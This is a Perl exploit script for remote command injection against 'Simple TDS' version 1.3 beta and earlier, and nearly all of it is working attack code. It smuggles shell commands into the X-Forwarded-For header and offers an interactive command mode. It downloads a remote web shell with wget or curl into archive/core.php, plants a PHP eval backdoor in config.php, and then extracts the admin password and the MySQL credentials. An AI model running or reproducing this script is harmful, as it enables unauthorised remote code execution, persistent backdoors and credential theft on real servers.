#!/usr/bin/perl -w

###
use strict;
use Getopt::Std;
use LWP::UserAgent;
use HTTP::Request;
###

my %opt;
getopt(':u:t:p:s:', \%opt);

if ($opt{h} or !$opt{u}) {
	print "
	* EXPLOIT:            Simple TDS <= 1.3 beta
	* VULNERABILITY:      shell_exec() Remote Command Injection Exploit
	* WEB-SITE:           nig.org.ua

	".$0." -u <URL> [http://site.com/tds/go.php|http://site.com/tds/|http://site.com/tds/go.php?sid=10]
	".$0." -t [cmd|shell|backdor|mini-shell]
	".$0." -p <SHELL URL> [http://site.to/shell.txt|http://lol.narod.ru/shell.txt]
	".$0." -m Read and print config.
	".$0." -s <SIGNATURE FROM LOAD SHELL>
	\n";
	exit;
}

print "[*] Start ...\n";
$opt{u} =~ s#go\.ph.+##;
$opt{u} .= 'http://' unless ($opt{u} =~ m#http://#i);
my ($domian) = $opt{u} =~ m#://(.+?)/#;

my $ua = LWP::UserAgent->new(max_redirect => 0);
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)');
if (is_tds($opt{u}, $ua)) {
	print '[+] Is a Simple TDS'."\n";
} else {
	print '[-] Is not a Simple TDS'."\n";
	exit;
}
$ua->default_headers->push_header('X-Forwarded-For' => '127.0.0.1');
my $result = undef;

if (!$opt{t} or $opt{t} eq 'cmd') {
	print "Enter Command: ";
	while (<STDIN>) {
		chomp($_);
		my $req = HTTP::Request->new(GET => $opt{u});
		$req->header('X-Forwarded-For' => '127.0.0.1; '.$_);
		$ua->request($req);
		print "Enter Command: ";
	}
} elsif ($opt{t} eq 'shell') {
	my @pl = ('echo >> ./archive/core.php `perl -e "use LWP::Simple; getprint(\'{PL}\')"`', 'perl -e "use LWP::Simple; open(F, \'>\', \'./archive/core.php\'); print F get(\'{PL}\'); close(F);"', 'wget -O "./archive/core.php" "{PL}"', 'echo >> ./archive/core.php `curl "{PL}"`', 'curl "{PL}" >> ./archive/core.php');
	for my $p (@pl) {
		$p =~ s#\{PL\}#$opt{p}#;
		$ua = LWP::UserAgent->new(max_redirect => 0);
		$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)');
		$ua->default_headers->push_header('X-Forwarded-For' => '127.0.0.1; '.$p);
		
		my $res = $ua->get($opt{u}.'go.php?sid=1');
		$res = $ua->get($opt{u}.'archive/core.php');
		
		if ($res->code == 200 and $res->decoded_content =~ m#$opt{s}#) {
			$result = 'Pay Load: '.$p."\nREGEXP: ".$opt{s}."\nSHELL: ".$opt{u}.'archive/core.php'."\n";
			last;
		}
	}
} elsif ($opt{t} eq 'backdor') {
	my @pl = ('echo >> \'config.php\' \'<?php eval($_GET[\'e\']); ?>\'', 'echo >> config.php `perl -e "print \'<?php eval($_GET[\'e\']); ?>\'"`', 'perl -e "open(F, \'>\', \'config.php\'); print F \'<?php eval($_GET[\'e\']); ?>\'; close(F);"');
	for my $p (@pl) {
		$ua = LWP::UserAgent->new(max_redirect => 0);
		$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)');
		$ua->default_headers->push_header('X-Forwarded-For' => '127.0.0.1; '.$p);
		
		my $res = $ua->get($opt{u}.'go.php?sid=1');
		$res = $ua->get($opt{u}.'config.php?e=echo("SHELL");');
		
		if ($res->code == 200 and $res->decoded_content =~ m#SHELL#) {
			$result = 'Pay Load: '.$p."\nSHELL: ".$opt{u}.'config.php?e=phpinfo();';
			if ($opt{c}) {
				my %config = pars_config($opt{u}, $ua);
				$result .= "\n\nADMIN PASSWORD: ".$config{'password'}.
				"\n\nMySql:\nHOST: ".$config{'mysql_host'}."\nLOGIN: ".$config{'mysql_login'}."\nPASSWORD: ".$config{'mysql_pass'}."\nDB: ".$config{'mysql_db'}."\n";
			}
			last;
		}
	}
} elsif ($opt{t} eq 'mini-shell') {
	my @pl = ('echo >> ./archive/core.php `perl -e "print \'<?php eval($_GET[\'e\']); ?>\'`', 'perl -e "open(F, \'>\', \'./archive/core.php\'); print F \'<?php eval($_GET[\'e\']); ?>\'; close(F);"', 'echo \'<?php eval($_GET[\'e\']); ?>\' >> ./archive/core.php');
	for my $p (@pl) {
		$ua = LWP::UserAgent->new(max_redirect => 0);
		$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)');
		$ua->default_headers->push_header('X-Forwarded-For' => '127.0.0.1; '.$p);

		my $res = $ua->get($opt{u}.'go.php?sid=1');
		$res = $ua->get($opt{u}.'archive/core.php?e=echo("SHELL");');

		if ($res->code == 200 and $res->decoded_content =~ m#SHELL#) {
			$result = 'Pay Load: '.$p."\nSHELL: ".$opt{u}.'archive/core.php?e=phpinfo();';
			if ($opt{c}) {
				my %config = pars_config($opt{u}, $ua);
				$result .= "\n\nADMIN PASSWORD: ".$config{'password'}.
				"\n\nMySql:\nHOST: ".$config{'mysql_host'}."\nLOGIN: ".$config{'mysql_login'}."\nPASSWORD: ".$config{'mysql_pass'}."\nDB: ".$config{'mysql_db'}."\n";
			}
			last;
		}
	}
} else {
	print "
	* EXPLOIT:            Simple TDS <= 1.3 beta
	* VULNERABILITY:      shell_exec() Remote Command Injection Exploit
	* WEB-SITE:           nig.org.ua

	Wrong parametr [t] = ".$opt{t}."
	".$0." -t [cmd|shell|backdor]
	\n";
}

if ($result) {
	print "[*] Finished ... [OK]\n[!] Result: \n".$result."\n";
} else {
	print "[*] Finished ... [ERROR]\n";
}

sub is_tds {
	my ($url, $ua) = @_;
	my $res = $ua->get($url.'header.php');
	if ($res->code == 200) {
		if ($res->decoded_content =~ m#<title>Simple TDS</title># or $res->decoded_content =~ m#<td>Simple TDS#) {
			return 1;
		} else {
			print "\n\n\n".$res->decoded_content."\n\n\n";
			return 0;
		}
	} else {
		print "\n\n".$url.'header.php'."\n".$res->decoded_content."\n\n\n";
		return 0;
	}
}

sub pars_config {
	my ($url, $ua) = @_;
	my $res = $ua->get($url.'config.php?e=echo(file_get_contents(\'config.php\'));');
	my %rsp;
	if ($res->content) {
		($rsp{'mysql_host'})  = $res->content =~ m#\$mysql_host = "(.+?)";#;
		($rsp{'mysql_login'}) = $res->content =~ m#\$mysql_login = "(.+?)";#;
		($rsp{'mysql_pass'})  = $res->content =~ m#\$mysql_password = "(.+?)";#;
		($rsp{'mysql_db'})    = $res->content =~ m#\$my_database = "(.+?)";#;
		($rsp{'password'})    = $res->content =~ m#\$password = "(.+?)";#;
	}
	return %rsp;
}